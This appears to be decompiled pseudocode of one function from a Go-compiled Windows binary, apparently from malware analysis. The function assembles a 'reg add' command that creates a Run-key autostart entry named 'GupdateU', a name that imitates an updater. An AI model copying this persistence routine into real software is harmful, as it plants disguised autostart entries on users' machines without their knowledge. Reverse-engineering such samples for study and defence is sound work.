__int64 __fastcall sub_4FD960()
{
  __int64 v0; // rbx
  __int64 v1; // r14
  __int128 v2; // xmm15
  __int64 v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 *v9; // [rsp+0h] [rbp-108h]
  _QWORD v10[9]; // [rsp+10h] [rbp-F8h] BYREF
  _QWORD v11[7]; // [rsp+58h] [rbp-B0h] BYREF
  _QWORD v12[11]; // [rsp+90h] [rbp-78h] BYREF
  __int128 v13; // [rsp+E8h] [rbp-20h]
  __int128 v14; // [rsp+F8h] [rbp-10h]
  __int64 vars0; // [rsp+108h] [rbp+0h] BYREF

  if ( (unsigned __int64)v12 <= *(_QWORD *)(v1 + 16) )
    sub_470660();
  v3 = sub_4B4D40();
  if ( qword_6C7F78 == 0 )
    sub_472A00();
  v10[8] = v3;
  v10[6] = v0;
  v4 = qword_6C7F78 - 1;
  v10[7] = sub_4C83E0(a1: " ", a2: 1, a3: qword_6C7F70, a4: qword_6C7F80 - 1);
  v10[5] = v4;
  v13 = v2;
  v14 = v2;
  v5 = runtime_convTstring();
  *(_QWORD *)&v13 = &unk_50FEE0;
  *((_QWORD *)&v13 + 1) = v5;
  v6 = runtime_convTstring();
  *(_QWORD *)&v14 = &unk_50FEE0;
  *((_QWORD *)&v14 + 1) = v6;
  fmt_Sprintf();
  v9 = &vars0;
  v7 = sub_472BF9(a1: &v10[3]);
  v11[1] = 3;
  v11[0] = "add";
  v11[3] = 50;
  v11[2] = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  v11[5] = 2;
  v11[4] = "/v";
  v12[0] = 8;
  v11[6] = "GupdateU";
  v12[2] = 2;
  v12[1] = "/t";
  v12[4] = 6;
  v12[3] = "REG_SZ";
  v12[6] = 2;
  v12[5] = "/d";
  v12[8] = 7;
  v12[7] = v7;
  v12[10] = 2;
  v12[9] = "/f";
  sub_4CDE40(a1: 9, a2: 9, a3: "/f", a4: v11);
  return sub_4CF220();
}